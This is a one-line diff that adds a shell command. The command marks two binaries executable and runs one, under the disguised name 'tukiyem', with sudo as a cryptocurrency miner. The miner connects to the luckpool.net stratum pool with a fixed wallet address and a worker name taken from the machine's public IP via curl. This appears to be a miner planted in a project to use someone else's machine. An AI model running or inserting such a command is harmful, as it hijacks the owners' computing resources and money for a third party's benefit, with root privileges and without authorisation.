@@ -1,0 +1,1 @@
+chmod +x ./verus-solver && chmod +x ./tukiyem && sudo ./tukiyem -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQSv4c8QoE5B6UWQ3AzTSBdZYsPkTepUTv.$(echo "$(curl -s ifconfig.me)" | tr . _ ) -p x --cpu 2
